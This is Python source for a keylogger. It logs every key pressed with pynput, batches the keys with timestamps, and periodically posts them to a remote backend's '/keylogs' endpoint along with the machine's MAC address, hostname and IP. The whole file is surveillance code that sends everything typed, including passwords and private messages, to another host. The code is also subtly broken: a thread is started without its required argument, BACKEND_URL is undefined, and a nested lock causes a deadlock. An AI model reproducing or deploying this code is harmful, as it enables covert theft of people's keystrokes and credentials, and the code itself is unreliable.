from pynput import keyboard
import requests
import threading
from datetime import datetime
import time
import socket
import uuid

# Interval in seconds to send batched keystrokes
SEND_INTERVAL = 20  # Adjust as needed (e.g., 5 seconds)

# Buffer to store keystrokes
keystroke_buffer = []
buffer_lock = threading.Lock()  # Thread-safe access to the buffer


# Function to send batched keystrokes to the backend
def send_batched_keystrokes(backend: str):
    while True:
        time.sleep(SEND_INTERVAL)
        with buffer_lock:
            if keystroke_buffer:  # Only send if there are keystrokes
                mac = (
                    ":".join(
                        [
                            "{:02x}".format((uuid.getnode() >> i) & 0xFF)
                            for i in range(0, 8 * 6, 8)
                        ][::-1]
                    ),
                )[0]
                payload = {
                    "deviceId": mac,
                    "mac": mac,
                    "hostname": socket.gethostbyaddr(socket.gethostname())[0],
                    "ip": get_ip(),
                    "keys": keystroke_buffer.copy(),
                }
                keystroke_buffer.clear()  # Clear the buffer after copying
                try:
                    response = requests.post(f"{backend}/keylogs", json=payload)
                    response.raise_for_status()
                    print(f"Sent {len(payload)} keystrokes to backend")
                except requests.exceptions.RequestException as e:
                    print(f"Failed to send keystrokes: {e}")
                    # Optionally, add failed keystrokes back to buffer for retry
                    keystroke_buffer.extend(payload)


# Function to add a keystroke to the buffer
def buffer_keystroke(key_str):
    with buffer_lock:
        keystroke_buffer.append(
            {
                "key": key_str,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
        )


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(("89.207.132.170", 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP


# Function to handle key press events
def handle_key_press(key):
    print("{} was just preseed to buffer".format(key))
    try:
        key_str = key.char  # Alphanumeric keys
    except AttributeError:
        key_str = str(key)  # Special keys (e.g., Key.space)

    buffer_keystroke(key_str)


# Function to handle key release (stops listener on Esc)
def handle_key_release(key):
    print("releasing something")
    if key == keyboard.Key.esc:
        # Send any remaining keystrokes before stopping
        with buffer_lock:
            if keystroke_buffer:
                send_immediate()
        pass


# Function to send buffer immediately (used on shutdown)
def send_immediate():
    with buffer_lock:
        if keystroke_buffer:
            payload = keystroke_buffer.copy()
            keystroke_buffer.clear()
            try:
                response = requests.post(BACKEND_URL, json=payload)
                response.raise_for_status()
                print(f"Sent {len(payload)} keystrokes to backend (immediate)")
            except requests.exceptions.RequestException as e:
                print(f"Failed to send immediate keystrokes: {e}")


# Start the keyboard listener and batch sender
def main():
    print(
        f"Starting keystroke recorder... Sending batches every {SEND_INTERVAL} seconds. Press Esc to stop."
    )

    # Start the batch sending thread
    sender_thread = threading.Thread(target=send_batched_keystrokes, daemon=True)
    sender_thread.start()

    # Start the keyboard listener
    with keyboard.Listener(
        on_press=handle_key_press, on_release=handle_key_release
    ) as listener:
        listener.join()


if __name__ == "__main__":
    main()
